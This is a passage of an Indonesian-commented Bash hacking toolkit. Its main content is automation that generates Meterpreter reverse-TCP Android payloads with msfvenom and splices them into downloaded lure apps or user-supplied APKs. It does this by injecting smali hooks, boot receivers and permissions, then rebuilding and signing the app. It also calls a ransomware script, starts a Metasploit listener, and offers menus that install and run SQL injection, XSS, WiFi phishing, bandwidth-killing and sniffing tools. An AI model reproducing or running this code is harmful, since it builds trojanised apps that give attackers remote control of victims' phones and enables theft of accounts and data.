        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle ave player please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr ave/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit ave/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild design please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b ave -o malware.apk
        rm -fr ave.apk ave payload payload.apk
        spiner
}

# fungsi backdoor indoxxi
#
function indoxxi(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download indoxxi from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/indoxxi.apk?raw=true > /dev/null 2>&1
        mv indoxxi.apk?raw=true indoxxi.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle indoxxi please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d indoxxi.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle indoxxi please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr indoxxi/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit indoxxi/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild indoxxi please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b indoxxi -o malware.apk
        rm -fr ave.apk ave payload payload.apk
        spiner
}

# fungsi backdoor piscart pro
#
function picsart(){
        $fixjava
        sets
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/Malware/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] generate backdoor . . .\033[32;1m succesfully\033[31;1m\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download piscart pro from template\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        wget https://github.com/K1M4K-ID/malware/blob/main/piscart.apk?raw=true > /dev/null 2>&1
        mv piscart.apk?raw=true piscart.apk > /dev/null
        printf "\033[37;1m[\033[32;1m*\033[37;1m] download\033[32;1m succesfully\033[31;1m\n"
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle payload please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d payload.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompyle piscart pro please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d piscart.apk
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle piscart pro please wait\033[31;1m\n"
        cd $path/Malware
        rm -fr piscart/smali/com/metasploit/stage && cp -r payload/smali/com/metasploit piscart/smali/com/metasploit
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild design please wait\033[31;1m\n"
        spiner
        echo
        cd $path/Malware
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool b piscart -o malware.apk
        rm -fr picsart.apk piscart payload payload.apk
        spiner
}

# fungsi ubah nama backdoor
#
function rename_backdoor(){
read -p "$(printf "\033[37;1m[\033[31;1m*\033[37;1m] masukan nama backdoor baru : "'\033[34;1m')" new
printf '\033[31;1m'
spiner
cd $path/Malware && mv malware.apk $new.apk
echo
sleep 0.025
printf "\033[31;1m[\033[32;1m✔\033[31;1m]\033[37;1m nama backdoor berhasil dibuat menjadi ~>\033[31;1m $new\n"
printf '\033[31;1m'
spiner
echo
sleep 3
}

# fungsi apus data sampah
#
function clear_data(){
        rm -fr ori.apk payload payload.apk original && mv $nama.apk Malware
}

# fix java sudo apktool, and sign
#
#_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
# backdoor buat inject
#
function inject_payload(){
        sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -a dalvik --platform android --arch dalvik -o $path/payload.apk | awk 'NR == 9 {print $0}' > /dev/null 2>&1
        spiner
        echo
}

# fungsi get aplikasi web GUI
#
function xyz()
{
 orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
}

# decompyle payload
#
function decompile_payload(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile payload\033[31;1m\n"
        spiner
        echo
        _SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS" && unset _JAVA_OPTIONS && alias java='java"$_SILENT_JAVA_OPTIONS"'
        sudo apktool d -f $path/payload.apk
        spiner
        echo
}

# decompile original
#
function decompile_original(){
        printf "\033[37;1m[\033[32;1m*\033[37;1m] decompile original\033[31;1m\n"
        spiner
        echo
        sudo apktool d -f -o $path/original $orig
        spiner
        echo
}

# rebuild payload original
#
function rebuild_original(){
	printf '\033[31;1m'
        spiner
        echo
        printf "\033[37;1m[\033[32;1m*\033[37;1m] rebuild backdoor please wait\033[31;1m\n"
        spiner
        echo
        sudo apktool b $path/original -o ori.apk
        spiner
        echo
}

# add permission dan hook
#
function perms()
{
 printf $ku""
 printf "\033[37;1m[\033[32;1m*\033[37;1m] menambahkan permission and hook smali\033[31;1m\n"
 spiner
 echo
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 android_nam=$tmp
}

# functions hook smali
#
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke : $hook_num \n"
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  printf "\033[37;1minject Smali : $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  printf "\033[37;1mbaris ke : $hook_num \n"
  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    printf '\033[31;1m'
    spiner
    printf "\033[37;1m[\033[31;1mx\033[37;1m] tidak ditemukan : $android_activity.smali\n"
    printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba lagi . . .\033[31;1m\n"
    spiner
    sleep 2
    echo
    printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    printf "\033[37;1minject Smali : $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    printf "\033[37;1mbaris ke : $hook_num \n"
    printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi
 fi
}

# fungsi android user input backdoor file
#
function backdoor_file(){
        sets_original
        inject_payload
        xyz
        decompile_payload
        decompile_original
        perms
        hook_smalies
        sleep 1
        rebuild_original
        sleep 1
        sign_orig
        sleep 1
        clear_data
        sleep 1
}

function backdoor_ransomware() {
	#statements
	clear
	baner
	echo
	echo
	pt=".data/ransomware"
	cd $pt;python3 ransomware.py;cd ../..
	sleep 5
	sets_original
	inject_payload
	xyz
	decompile_payload
	decompile_original
	perms
	hook_smalies
	sleep 1
	rebuild_original
	sleep 1
	sign_orig
	sleep 1
	clear_data
	sleep 1
}

# listerner metasploit
function listerners(){
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1mlisterner\033[32;1m android\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1mx\033[31;1m] \033[37;1mkembali\033[31;1m\n\n"
    sleep 0.025
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    echo
    if [ $xyz = "1"  ];
    then
    listener_kali
	msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $lh;set LPORT $lp;exploit;"
	clear
	listerners

	elif [ $xyz = "x"  ];
	then
	run_metasploit

	else
        printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
	sleep 2
	clear
	listerners

	fi
}

function run_metasploit(){
        clear
        baner
        echo
        metasploit
                if [ $xyz = "1"  ];
                then
                android
                run_metasploit

                elif [ $xyz = "2"  ];
                then
                clear
                baner
                echo
                listerners
                run_metasploit

                elif [ $xyz = "0"  ];
                then
                runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_metasploit

                fi
}


# web attack - sql injection
function sqli(){
    clear
    baner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall sql-injection\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun sql-injection\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
    echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/sql-injection ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msql-injection already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sql-injection \033[31;1mnot found\033[37;1m, installing sql-injection!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/K1M4K-ID/sql-injection > /dev/null 2>&1
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

        cd $path/.data/sql-injection;bash sql-injection.sh
        sqli
        sleep 2

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/sql-injection ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msql-injection already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sql-injection \033[31;1mnot found\033[37;1m, installing sql-injection!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/K1M4K-ID/sql-injection > /dev/null 2>&1
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
        cd $path/.data/sql-injection;bash sql-injection.sh
        sleep 3
        sqli

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        sqli
        fi
}

# web attack - xss
function xss(){
    clear
    baner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall XSS\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun XSS\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
		echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/xss ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mxss already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m xss \033[31;1mnot found\033[37;1m, installing xss!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/K1M4K-ID/xss > /dev/null 2>&1
								sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

        cd $path/.data/xss;python3 payloader.py
        xss
        sleep 2

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/xss ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mxss already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m xss \033[31;1mnot found\033[37;1m, installing xss!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/K1M4K-ID/xss > /dev/null 2>&1
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
        cd $path/.data/xss;python3 payloader.py
        sleep 3
        xss

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        xss
        fi
}

# fungsi untuk menjalankan menu untuk web attack
function run_web_attack(){
        clear
        baner
        echo
        web_attack
                if [ $xyz = "1"  ];
                then
                sqli
                run_web_attack

                elif [ $xyz = "2"  ];
                then
                xss
                run_web_attack

                elif [ $xyz = "0"  ];
                then
                runer

                else
                printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
                sleep 2
                run_web_attack

                fi
}

# wifi attack
function fluxion(){
    clear
    baner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall fluxion - for hacking wifi\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun fluxion\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
		echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/fluxion ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mfluxion already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m fluxion \033[31;1mnot found\033[37;1m, installing fluxion!\n"
                cd $path/.data > /dev/null
                git clone https://github.com/K1M4K-ID/fluxion > /dev/null 2>&1
								sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

        unzip fluxion.zip;rm -fr fluxion.zip;cd fluxion;cd install;chmod +x *;bash install.sh
				sleep 3
				fluxion

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/fluxion ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mfluxion already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m fluxion \033[31;1mnot found\033[37;1m, installing fluxion!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/K1M4K-ID/fluxion > /dev/null 2>&1
					unzip fluxion.zip;rm -fr fluxion.zip;cd fluxion;cd install;chmod +x *;bash install.sh
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
				cd $path/.data/fluxion;bash fluxion.sh
				sleep 3
        fluxion

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        fluxion
        fi
}

# wifi agent for hacking wifi with captive portal
function wifi-agent(){
    clear
    baner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall wifi-agent - for hacking account\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun wifi-agent\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
		echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/wifi-agent ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwifi-agent already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m wifi-agent \033[31;1mnot found\033[37;1m, installing wifi-agent!\n"
                cd $path/.data > /dev/null
								git clone https://github.com/makdosx/wifi-agent;chmod -R 777 wifi-agent > /dev/null 2>&1
								sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

				sleep 3
				wifi-agent

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/wifi-agent ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mwifi-agent already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m wifi-agent \033[31;1mnot found\033[37;1m, installing wifi-agent!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/makdosx/wifi-agent;chmod -R 777 wifi-agent > /dev/null 2>&1
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
				cd $path/.data/wifi-agent;bash wifiagent.sh
				sleep 3
        wifi-agent

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        wifi-agent
        fi
}

# evillimiter for hacking bandwith wifi
function evillimiters(){
    clear
    baner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall evillimiter - for kill wifi\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun evillimiter\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
		echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -d $path/.data/evillimiter ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mevillimiter already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m evillimiter \033[31;1mnot found\033[37;1m, installing evillimiter!\n"
                cd $path/.data > /dev/null
								git clone https://github.com/bitbrute/evillimiter.git;chmod -R 777 evillimiter;cd evillimiter;sudo python3 setup.py install > /dev/null 2>&1
								sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

				sleep 3
				wifi-agent

        elif [ $xyz = "2"  ];
        then
					if [[ -d $path/.data/evillimiter ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mevillimiter already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m evillimiter \033[31;1mnot found\033[37;1m, installing evillimiter!\n"
					cd $path/.data > /dev/null
					git clone https://github.com/bitbrute/evillimiter.git;chmod -R 777 evillimiter;cd evillimiter;sudo python3 setup.py install > /dev/null 2>&1
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
				evillimiter
				sleep 3
        evillimiters

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        evillimiters
        fi
}




# bettercap for sniffing
function better(){
    clear
    baner
    echo
    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall bettercap - for sniffing\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun bettercap\033[31;1m\n"
    sleep 0.025
    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
    sleep 0.025
		echo
    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
    sleep 0.025
    printf '\033[31;1m'
    spiner
    echo
        if [ $xyz = "1"  ];
        then

                if [[ -f /usr/bin/bettercap ]]; then
                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mbettercap already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
                spiner
                echo
                sleep 2
                clear
                else
                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m bettercap \033[31;1mnot found\033[37;1m, installing bettercap!\n"
								sudo apt-get install bettercap -y
								sleep 0.025
                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                printf '\033[31;1m'
                spiner
                echo

                fi

				sleep 3
				wifi-agent

        elif [ $xyz = "2"  ];
        then
					if [[ -f /usr/bin/bettercap ]]; then
					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mbettercap already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
					spiner
					echo
					sleep 2
					clear
					else
					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m bettercap \033[31;1mnot found\033[37;1m, installing bettercap!\n"
					sudo apt-get install bettercap -y
					sleep 0.025
					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
					printf '\033[31;1m'
					spiner
					echo

					fi
        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
				sleep 2
				clear
				bettercap
				sleep 3
        better

        elif [ $xyz = "0"  ];
        then
        run_lainya

        else
        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
        sleep 2
        better
        fi
}

# mitm attack for sniffing http/https
function proxy(){
